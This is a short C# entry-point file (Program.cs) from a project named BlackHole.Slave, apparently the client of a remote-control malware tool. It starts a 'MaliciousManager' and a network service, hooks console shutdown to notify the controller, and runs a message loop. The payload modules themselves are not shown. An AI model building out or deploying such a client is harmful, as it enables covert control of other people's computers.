using BlackHole.Slave.Helper;
using BlackHole.Slave.Helper.Native.Impl;
using BlackHole.Slave.Malicious;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackHole.Slave
{
    class Program
    {
        static void Main(string[] args)
        {
            MaliciousManager.Instance.Initialize();
            NetworkService.Instance.Initialize();

            Kernel32.SetConsoleCtrlHandler((ctrl) =>
            {
                NetworkService.Instance.FireShutdown((int)ctrl);
                Thread.Sleep(500);
                return true;
            }, true);
            Application.Run();
        }
    }
}
